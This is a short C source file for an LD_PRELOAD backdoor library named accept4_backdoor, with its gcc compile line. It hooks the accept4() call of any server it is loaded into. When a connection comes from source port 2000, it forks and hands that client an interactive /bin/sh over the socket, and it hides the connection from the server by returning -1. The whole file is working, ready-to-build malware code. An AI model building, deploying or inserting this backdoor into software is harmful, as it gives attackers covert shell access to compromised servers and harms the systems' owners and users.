// LD_PRELOAD hijacking
// Compile: gcc -FPIC -shared accept4_backdoor.c -o accept4_backdoor.so -ldl 
#define _GNU_SOURCE       // Needed for RTLD_NEXT
#include <stdio.h>        // Standard include
#include <sys/types.h>    // Socket Stuff
#include <sys/socket.h>   // Socket Stuff
#include <netinet/in.h>   // Socket Stuff
#include <netdb.h>        // Socket Stuff
#include <arpa/inet.h>    // Socket Stuff
#include <unistd.h>       // for dup2(), execve(), fork()
#include <string.h>       // strlen()
#include <dlfcn.h>        // dlsym

static const unsigned short BACKDOOR_SRC_PORT = 2000;

// Pointer to real accept4
static int (*real_accept)(int, struct sockaddr *, socklen_t *,int) = NULL;

void __attribute__((constructor)) backdoor_initalize() {
  // Code executed before the fake accept4()
  real_accept = dlsym(RTLD_NEXT, "accept4");
}

void launch_backdoor(int client_sock_fd) {
    dup2(client_sock_fd, 0);
    dup2(client_sock_fd, 1);
    dup2(client_sock_fd, 2);
    execve("/bin/sh", 0, 0);
}

// Fake accept4
int accept4(int sockfd, struct sockaddr *addr , socklen_t *addrLen, int flags) {
  int client_sock_fd = 0;
  struct sockaddr_in *addr_in = NULL;
  client_sock_fd = real_accept(sockfd, (struct sockaddr *) addr, addrLen,flags);
  
  // get a sockaddr_in pointer to the sockaddr struct so we can get the
  // IP address and source port information more easily.
  addr_in = (struct sockaddr_in *)addr;
 
  // hijacked behavior
  if (ntohs(addr_in->sin_port) == BACKDOOR_SRC_PORT) {
      // Create a child process to launch the bind shell
      if (fork() == 0) {
        launch_backdoor(client_sock_fd);
      } else {
        close(client_sock_fd);
        return -1;
      }
  }
  // Normal behavior
  return client_sock_fd;
}
